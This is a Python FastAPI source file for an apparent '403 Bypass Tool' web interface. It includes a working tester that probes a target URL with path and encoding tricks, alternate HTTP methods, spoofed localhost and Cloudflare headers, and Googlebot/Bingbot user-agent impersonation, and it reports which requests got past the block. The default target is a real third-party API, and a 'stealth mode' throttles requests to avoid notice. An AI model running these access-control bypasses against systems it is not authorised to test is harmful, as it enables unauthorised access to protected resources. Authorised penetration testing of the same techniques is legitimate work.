#!/usr/bin/env python3
"""
Web Interface for 403 Bypass Tool
Provides a user-friendly web interface to test bypass techniques
"""

from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import uvicorn
import asyncio
import aiohttp
import json
import time
from typing import List, Dict, Optional
import os
from pathlib import Path

app = FastAPI(title="403 Bypass Tool - Web Interface", version="1.0.0")

# Create templates directory if it doesn't exist
templates_dir = Path("templates")
templates_dir.mkdir(exist_ok=True)

# Create the HTML template
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Bypass Tool - Web Interface</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        .content {
            padding: 40px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }
        
        input[type="url"], input[type="text"], select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        input[type="url"]:focus, input[type="text"]:focus, select:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .checkbox-group {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .checkbox-item {
            display: flex;
            align-items: center;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 6px;
            transition: background-color 0.2s ease;
        }
        
        .checkbox-item:hover {
            background: #e9ecef;
        }
        
        .checkbox-item input[type="checkbox"] {
            margin-right: 10px;
            transform: scale(1.2);
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            width: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .results {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .result-item {
            padding: 10px;
            margin: 5px 0;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border-left: 4px solid #28a745;
        }
        
        .failed {
            background: #f8d7da;
            color: #721c24;
            border-left: 4px solid #dc3545;
        }
        
        .warning {
            background: #fff3cd;
            color: #856404;
            border-left: 4px solid #ffc107;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #666;
            margin-top: 5px;
        }
        
        .demo-section {
            background: #e3f2fd;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            border-left: 4px solid #2196f3;
        }
        
        .demo-section h3 {
            color: #1976d2;
            margin-bottom: 15px;
        }
        
        .demo-targets {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .demo-target {
            background: white;
            padding: 15px;
            border-radius: 6px;
            cursor: pointer;
            transition: transform 0.2s ease;
        }
        
        .demo-target:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        
        .demo-target h4 {
            color: #1976d2;
            margin-bottom: 8px;
        }
        
        .demo-target p {
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 403 Bypass Tool</h1>
            <p>Advanced Web Application Security Testing Tool</p>
        </div>
        
        <div class="content">
            <div class="demo-section">
                <h3>🎯 Demo & Testing</h3>
                <p>This tool demonstrates various techniques to bypass HTTP 403 Forbidden responses. The Poe API (https://api.poe.com) has robust Cloudflare protection that blocks most bypass attempts, making it an excellent example of strong security implementation.</p>
                
                <div class="demo-targets">
                    <div class="demo-target" onclick="setTarget('https://api.poe.com')">
                        <h4>Poe API (Protected)</h4>
                        <p>Cloudflare-protected API with advanced bot detection. Good for testing tool capabilities against strong protection.</p>
                    </div>
                    <div class="demo-target" onclick="setTarget('https://httpbin.org/status/403')">
                        <h4>HTTPBin 403 (Test)</h4>
                        <p>Simple 403 response for testing basic bypass techniques without advanced protection.</p>
                    </div>
                    <div class="demo-target" onclick="setTarget('https://example.com/admin')">
                        <h4>Custom Target</h4>
                        <p>Test against your own target. Make sure you have permission to test!</p>
                    </div>
                </div>
            </div>
            
            <form id="bypassForm">
                <div class="form-group">
                    <label for="target_url">🎯 Target URL:</label>
                    <input type="url" id="target_url" name="target_url" required 
                           placeholder="https://example.com/admin" 
                           value="https://api.poe.com">
                </div>
                
                <div class="form-group">
                    <label for="test_mode">🔧 Test Mode:</label>
                    <select id="test_mode" name="test_mode">
                        <option value="quick">Quick Test (30 techniques)</option>
                        <option value="comprehensive">Comprehensive Test (100+ techniques)</option>
                        <option value="stealth">Stealth Mode (slow but careful)</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>🛠️ Bypass Categories:</label>
                    <div class="checkbox-group">
                        <div class="checkbox-item">
                            <input type="checkbox" id="path_variations" name="categories" value="path_variations" checked>
                            <label for="path_variations">Path Variations</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="http_methods" name="categories" value="http_methods" checked>
                            <label for="http_methods">HTTP Methods</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="header_bypasses" name="categories" value="header_bypasses" checked>
                            <label for="header_bypasses">Header Bypasses</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="user_agents" name="categories" value="user_agents" checked>
                            <label for="user_agents">User-Agent Variations</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="cloudflare_bypasses" name="categories" value="cloudflare_bypasses" checked>
                            <label for="cloudflare_bypasses">Cloudflare Bypasses</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="encoding_bypasses" name="categories" value="encoding_bypasses" checked>
                            <label for="encoding_bypasses">Encoding Bypasses</label>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    🚀 Start Bypass Testing
                </button>
            </form>
            
            <div id="results" class="results" style="display: none;">
                <h3>📊 Test Results</h3>
                <div id="resultsContent"></div>
            </div>
        </div>
    </div>

    <script>
        function setTarget(url) {
            document.getElementById('target_url').value = url;
        }
        
        document.getElementById('bypassForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const resultsDiv = document.getElementById('results');
            const resultsContent = document.getElementById('resultsContent');
            
            // Show loading state
            submitBtn.disabled = true;
            submitBtn.innerHTML = '🔄 Testing in Progress...';
            resultsDiv.style.display = 'block';
            resultsContent.innerHTML = `
                <div class="loading">
                    <div class="spinner"></div>
                    <p>Running bypass tests... This may take a few moments.</p>
                </div>
            `;
            
            // Collect form data
            const formData = new FormData(e.target);
            const categories = [];
            formData.getAll('categories').forEach(cat => categories.push(cat));
            
            const requestData = {
                target_url: formData.get('target_url'),
                test_mode: formData.get('test_mode'),
                categories: categories
            };
            
            try {
                const response = await fetch('/api/test-bypass', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(requestData)
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    displayResults(result);
                } else {
                    throw new Error(result.detail || 'Test failed');
                }
            } catch (error) {
                resultsContent.innerHTML = `
                    <div class="result-item failed">
                        ❌ Error: ${error.message}
                    </div>
                `;
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '🚀 Start Bypass Testing';
            }
        });
        
        function displayResults(result) {
            const resultsContent = document.getElementById('resultsContent');
            
            let html = `
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${result.total_tests}</div>
                        <div class="stat-label">Total Tests</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${result.successful_bypasses.length}</div>
                        <div class="stat-label">Successful Bypasses</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${result.execution_time.toFixed(2)}s</div>
                        <div class="stat-label">Execution Time</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${((result.successful_bypasses.length / result.total_tests) * 100).toFixed(1)}%</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                </div>
            `;
            
            if (result.successful_bypasses.length > 0) {
                html += '<h4 style="margin-top: 20px; color: #28a745;">✅ Successful Bypasses:</h4>';
                result.successful_bypasses.forEach(bypass => {
                    html += `
                        <div class="result-item success">
                            🎯 <strong>${bypass.technique}</strong><br>
                            📍 URL: ${bypass.url}<br>
                            📊 Status: ${bypass.status_code} | Length: ${bypass.response_length}b | Time: ${bypass.response_time.toFixed(3)}s
                        </div>
                    `;
                });
            }
            
            if (result.interesting_responses && result.interesting_responses.length > 0) {
                html += '<h4 style="margin-top: 20px; color: #ffc107;">⚠️ Interesting Responses:</h4>';
                result.interesting_responses.forEach(response => {
                    html += `
                        <div class="result-item warning">
                            🔍 <strong>${response.technique}</strong><br>
                            📍 URL: ${response.url}<br>
                            📊 Status: ${response.status_code} | Length: ${response.response_length}b
                        </div>
                    `;
                });
            }
            
            // Show some failed attempts for context
            if (result.failed_attempts && result.failed_attempts.length > 0) {
                html += '<h4 style="margin-top: 20px; color: #dc3545;">❌ Sample Failed Attempts:</h4>';
                result.failed_attempts.slice(0, 5).forEach(attempt => {
                    html += `
                        <div class="result-item failed">
                            🚫 ${attempt.technique} - Status: ${attempt.status_code} | Length: ${attempt.response_length}b
                        </div>
                    `;
                });
                if (result.failed_attempts.length > 5) {
                    html += `<div class="result-item" style="text-align: center; font-style: italic;">... and ${result.failed_attempts.length - 5} more failed attempts</div>`;
                }
            }
            
            resultsContent.innerHTML = html;
        }
    </script>
</body>
</html>
"""

# Write the template file
with open(templates_dir / "index.html", "w") as f:
    f.write(html_template)

templates = Jinja2Templates(directory="templates")

class BypassTester:
    """Simplified bypass tester for the web interface"""
    
    def __init__(self):
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=10)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def test_bypass_techniques(self, target_url: str, test_mode: str, categories: List[str]) -> Dict:
        """Test various bypass techniques"""
        
        start_time = time.time()
        successful_bypasses = []
        interesting_responses = []
        failed_attempts = []
        
        # Define techniques based on categories
        techniques = []
        
        if "path_variations" in categories:
            techniques.extend([
                ("Path with trailing slash", target_url + "/"),
                ("Path with double slash", target_url + "//"),
                ("Path with dot", target_url + "/."),
                ("Path with dot-slash", target_url + "/./"),
                ("Path with encoded slash", target_url + "/%2F"),
                ("Path with encoded dot", target_url + "/%2E"),
            ])
        
        if "http_methods" in categories:
            techniques.extend([
                ("OPTIONS method", target_url, {"method": "OPTIONS"}),
                ("HEAD method", target_url, {"method": "HEAD"}),
                ("POST method", target_url, {"method": "POST"}),
                ("PUT method", target_url, {"method": "PUT"}),
                ("PATCH method", target_url, {"method": "PATCH"}),
            ])
        
        if "header_bypasses" in categories:
            techniques.extend([
                ("X-Forwarded-For localhost", target_url, {"headers": {"X-Forwarded-For": "127.0.0.1"}}),
                ("X-Real-IP localhost", target_url, {"headers": {"X-Real-IP": "127.0.0.1"}}),
                ("X-Originating-IP localhost", target_url, {"headers": {"X-Originating-IP": "127.0.0.1"}}),
                ("X-Remote-IP localhost", target_url, {"headers": {"X-Remote-IP": "127.0.0.1"}}),
                ("X-Client-IP localhost", target_url, {"headers": {"X-Client-IP": "127.0.0.1"}}),
            ])
        
        if "user_agents" in categories:
            techniques.extend([
                ("Googlebot User-Agent", target_url, {"headers": {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}),
                ("Bingbot User-Agent", target_url, {"headers": {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"}}),
                ("Mobile User-Agent", target_url, {"headers": {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"}}),
            ])
        
        if "cloudflare_bypasses" in categories:
            techniques.extend([
                ("CF-Connecting-IP", target_url, {"headers": {"CF-Connecting-IP": "127.0.0.1"}}),
                ("CF-IPCountry US", target_url, {"headers": {"CF-IPCountry": "US"}}),
                ("CF-Visitor", target_url, {"headers": {"CF-Visitor": '{"scheme":"https"}'}}),
            ])
        
        if "encoding_bypasses" in categories:
            techniques.extend([
                ("URL encoded path", target_url.replace("/", "%2F")),
                ("Double URL encoded", target_url.replace("/", "%252F")),
                ("Unicode normalization", target_url + "/%E2%80%8F"),
            ])
        
        # Limit techniques based on test mode
        if test_mode == "quick":
            techniques = techniques[:30]
        elif test_mode == "stealth":
            techniques = techniques[:20]  # Fewer tests for stealth mode
        
        # Test each technique
        for technique in techniques:
            if len(technique) == 2:
                technique_name, test_url = technique
                options = {}
            else:
                technique_name, test_url, options = technique
            try:
                method = options.get("method", "GET") if isinstance(options, dict) else "GET"
                headers = options.get("headers", {}) if isinstance(options, dict) else {}
                
                request_start = time.time()
                
                async with self.session.request(method, test_url, headers=headers, allow_redirects=False) as response:
                    content = await response.read()
                    response_time = time.time() - request_start
                    
                    result = {
                        "technique": technique_name,
                        "url": test_url,
                        "status_code": response.status,
                        "response_length": len(content),
                        "response_time": response_time
                    }
                    
                    # Categorize response
                    if response.status in [200, 201, 202, 204]:
                        successful_bypasses.append(result)
                    elif response.status in [301, 302, 307, 308] and len(content) > 100:
                        interesting_responses.append(result)
                    elif response.status != 403 or len(content) > 5000:  # Unusual response
                        interesting_responses.append(result)
                    else:
                        failed_attempts.append(result)
                
                # Delay for stealth mode
                if test_mode == "stealth":
                    await asyncio.sleep(0.5)
                else:
                    await asyncio.sleep(0.1)
                    
            except Exception as e:
                failed_attempts.append({
                    "technique": technique_name,
                    "url": test_url,
                    "status_code": 0,
                    "response_length": 0,
                    "response_time": 0,
                    "error": str(e)
                })
        
        execution_time = time.time() - start_time
        
        return {
            "target_url": target_url,
            "test_mode": test_mode,
            "categories": categories,
            "total_tests": len(techniques),
            "successful_bypasses": successful_bypasses,
            "interesting_responses": interesting_responses,
            "failed_attempts": failed_attempts,
            "execution_time": execution_time
        }

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    """Serve the main web interface"""
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/api/test-bypass")
async def test_bypass(request: Request):
    """API endpoint to run bypass tests"""
    try:
        data = await request.json()
        target_url = data.get("target_url", "").strip()
        test_mode = data.get("test_mode", "quick")
        categories = data.get("categories", [])
        
        if not target_url:
            raise HTTPException(status_code=400, detail="Target URL is required")
        
        if not target_url.startswith(("http://", "https://")):
            raise HTTPException(status_code=400, detail="Target URL must start with http:// or https://")
        
        async with BypassTester() as tester:
            results = await tester.test_bypass_techniques(target_url, test_mode, categories)
        
        return JSONResponse(content=results)
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Test failed: {str(e)}")

@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "message": "403 Bypass Tool API is running"}

if __name__ == "__main__":
    print("🚀 Starting 403 Bypass Tool Web Interface...")
    print("📍 Access the interface at: http://localhost:12000")
    print("🔧 API documentation at: http://localhost:12000/docs")
    
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=12000,
        reload=False,
        access_log=True
    )